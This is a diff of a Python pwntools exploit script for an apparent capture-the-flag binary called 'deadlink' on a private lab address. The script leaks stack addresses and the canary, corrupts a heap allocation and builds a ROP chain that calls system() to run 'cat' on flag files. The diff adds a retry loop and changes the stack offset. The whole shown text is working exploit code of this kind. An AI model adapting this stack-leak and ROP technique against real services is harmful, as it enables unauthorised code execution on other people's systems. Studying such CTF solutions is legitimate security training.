@@ -35,11 +35,11 @@ import re, sys, os
 exe  = ELF("./deadlink", checksec=False)
 libc = ELF("./libc.so.6", checksec=False)
 context.binary = exe
-context.log_level = os.environ.get("LL", "info")
+context.log_level = os.environ.get("LL", "warning")   # set LL=info to see every leak
 
 HOST = os.environ.get("HOST", "172.16.38.22")
 PORT = int(os.environ.get("PORT", "6656"))
-OFF  = int(os.environ.get("OFF", "0x28"), 16)   # saved_rip - OFF (0x28 reaches the read on the live target; sweep if needed)
+OFF  = int(os.environ.get("OFF", "0x38"), 16)   # saved_rip-0x38 avoids clobbering add()'s size local; 0x28 zeroes it
 
 def start():
     if args.REMOTE:
@@ -108,7 +108,7 @@ def leak_qword(addr):
     v, _ = parse_bin(viewbin(), 0)
     return v
 
-def main():
+def attempt():
     global io
     io = start()
     gate()
@@ -176,7 +176,7 @@ def main():
         if leak_qword(env - o) == target_ret:
             saved_rip = env - o; break
     if saved_rip is None:
-        log.failure("saved RIP not found"); io.interactive(); return
+        log.failure("saved RIP not found"); io.close(); return None
     canary    = leak_qword(saved_rip - 0x10)
     saved_rbp = leak_qword(saved_rip - 0x8)
     log.success(f"saved RIP = {hex(saved_rip)}")
@@ -236,7 +236,7 @@ def main():
     put(TAIL + 0x10, system)
     # Self-diagnosing command: echo a marker (proves the ROP fired) then try
     # several flag locations. system() runs /bin/sh -c "<cmd>".
-    cmd = b"echo ROP_OK; cat flag.txt /script/flag.txt /flag* 2>&1\x00"
+    cmd = b"echo ROP_OK;cat flag.txt /script/flag.txt 2>&1\x00"
     assert STR_OFF + len(cmd) <= 0xe8, "cmd too long"
     data[STR_OFF:STR_OFF + len(cmd)] = cmd
 
@@ -246,27 +246,39 @@ def main():
     if b"Data?" not in r:
         # Died before the read -> this OFF isn't reaching the allocation on this
         # target's frame layout. Tells us to change OFF, not the chain.
-        log.failure(f"process died before 'Data?' at OFF={hex(OFF)} (final malloc "
-                    f"didn't land). Try: OFF=0x28 / 0x38 / 0x48 python3 %s REMOTE" % sys.argv[0])
-        return
+        log.warning(f"died before 'Data?' (flaky poison) -> retry")
+        io.close(); return None
     io.send(bytes(data))         # add() prints Success, then returns into the chain
 
     out = io.recvrepeat(3)
-    print("----- raw output -----")
-    print(repr(out))
-    print("----------------------")
-    print(out.decode("latin-1", "ignore"))
     m = re.search(rb"bcsctf\{[^}]*\}", out)
     if m:
+        print(out.decode("latin-1", "ignore"))
         log.success("FLAG: " + m.group().decode())
-    elif b"ROP_OK" in out:
-        log.warning("ROP fired (saw ROP_OK) but no flag printed -> file/cwd/perms; "
-                    "the raw output above shows any cat error")
-        io.interactive()
-    else:
-        log.warning(f"no ROP_OK -> chain not executing at OFF={hex(OFF)}. "
-                    f"Send me the raw output above; also try OFF=0x38 / 0x20 / 0x30 / 0x18.")
-        io.interactive()
+        io.close(); return m.group().decode()
+    if b"ROP_OK" in out:
+        print(out.decode("latin-1", "ignore"))
+        log.warning("ROP fired but no flag -> file/cwd/perms; raw: %r" % out)
+        io.interactive(); return "ROP_OK"
+    io.close(); return None
+
+def attempt_before_data(r):
+    return b"Data?" not in r
+
+def main():
+    tries = int(os.environ.get("TRIES", "40"))
+    for i in range(tries):
+        print(f"[*] attempt {i+1}/{tries} (OFF={hex(OFF)})")
+        try:
+            res = attempt()
+        except (EOFError, Exception) as e:
+            log.warning(f"attempt error: {e}")
+            try: io.close()
+            except: pass
+            res = None
+        if res:
+            return
+    log.failure("no success after retries; try a different OFF (0x38/0x48/0x20)")
 
 if __name__ == "__main__":
     main()
